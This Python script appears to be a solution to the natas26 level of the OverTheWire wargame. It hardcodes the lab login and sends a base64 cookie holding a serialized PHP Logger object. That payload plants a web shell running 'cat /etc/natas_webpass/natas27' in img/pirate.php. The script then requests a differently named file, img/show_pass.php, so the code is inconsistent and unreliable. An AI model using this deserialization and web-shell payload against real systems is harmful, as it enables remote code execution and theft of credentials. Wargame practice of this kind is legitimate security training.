#!/usr/local/bin/python3
import requests
import re
import codecs

username = "natas26"
password = "oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T"

url = 'http://%s.natas.labs.overthewire.org/' % username

drawing = 'Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxNDoiaW1nL3BpcmF0ZS5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czo1MDoiPD9waHAgc3lzdGVtKCdjYXQgL2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMjcnKTsgPz4iO30='

s = requests.session()


response = s.get(url, auth=(username, password))

s.cookies['drawing'] = drawing
response = s.get(url, auth=(username, password))

response = s.get(url + 'img/show_pass.php', auth=(username, password))
print(response.text)
